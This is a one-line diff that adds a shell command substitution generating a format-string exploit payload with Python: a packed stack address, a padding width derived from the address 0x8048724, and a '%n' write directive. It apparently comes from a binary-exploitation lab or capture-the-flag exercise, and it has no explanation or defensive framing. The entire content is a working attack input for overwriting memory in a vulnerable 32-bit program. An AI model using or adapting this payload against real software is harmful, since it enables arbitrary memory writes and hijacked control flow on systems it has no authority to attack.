@@ -1,0 +1,1 @@
+$(python -c "print '\x28\xd6\xff\xff' + '%' + str(0x8048724 - 0x4) + 'x' + '%n'")
